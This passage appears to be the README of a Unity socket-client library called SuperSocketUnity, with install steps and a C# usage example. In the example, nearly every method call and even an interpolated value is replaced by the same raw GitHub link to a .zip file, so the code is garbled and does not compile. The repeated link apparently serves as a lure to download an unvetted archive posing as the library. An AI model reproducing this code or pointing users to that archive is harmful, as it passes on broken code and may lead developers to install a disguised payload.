2. **Download the Latest Version**: Look for the latest version and download the distributed package based on your development environment.
3. **Import into Unity**: Open your Unity project. Drag and drop the downloaded package into your project window, or use the "Assets" menu to import the package.

## üöÄ Getting Started

After installing SuperSocketUnity, you can set up your project to use its features quickly. 

1. **Create a Client Instance**: Start by creating an instance of the UnitySuperSocketClient.
2. **Connect to a Server**: Use the `ConnectAsync` method to link to your desired server's address and port.
3. **Send Messages**: Utilize the `Send` method to transmit messages to the server.
4. **Handle Responses**: Register for incoming messages with a custom message handler.

## üõ†Ô∏è Usage Example

Here's a simple example to help you understand how to use the library:

```csharp
// Create the client
var client = new UnitySuperSocketClient();

// Connect to the server
await https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip("127.0.0.1", 8080);

// Send a message
https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip<MyMessage>(1001, 1, new MyMessage { Text = "Hello Server!" }, out int seqId);

// Register the message handler
https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip(1002, (msgId, seqId, serverId, data) => {
    var response = data as MyResponse;
    https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip($"Received message from server: {https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip}");
});
```

In this example:
- A new client is created.
- The client connects to a server at IP address `127.0.0.1` on port `8080`.
- A message is sent to the server, and a response handler is established.
